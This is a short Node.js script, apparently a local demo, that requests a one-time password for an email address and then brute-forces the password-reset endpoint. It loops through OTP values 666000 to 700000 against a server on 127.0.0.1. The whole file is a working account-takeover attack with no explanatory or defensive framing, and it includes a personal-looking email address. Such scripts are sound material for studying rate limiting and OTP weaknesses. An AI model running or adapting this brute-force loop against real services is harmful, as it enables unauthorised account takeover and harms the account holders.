const axios = require('axios');
let data = JSON.stringify({
  "email": "pritam1212@gmail.com"
});

let config = {
  method: 'post',
  maxBodyLength: Infinity,
  url: 'http://127.0.0.1:3000/generate-otp',
  headers: { 
    'Content-Type': 'application/json'
  },
  data : data
};

axios.request(config)
.then((response) => {
  console.log(JSON.stringify(response.data));
})
.catch((error) => {
  console.log(error);
});


let i;
for (i = 666000; i <= 700000; i++) {
  let data = JSON.stringify({
    "email": "pritam1212@gmail.com",
    "otp": String(i)
  });
  
  let config = {
    method: 'post',
    maxBodyLength: Infinity,
    url: 'http://127.0.0.1:3000/reset-password',
    headers: { 
      'Content-Type': 'application/json'
    },
    data : data
  };
  
  axios.request(config)
  .then((response) => {
    console.log(JSON.stringify(response.data));
  })
  .catch((error) => {
    console.log(error);
  });
}



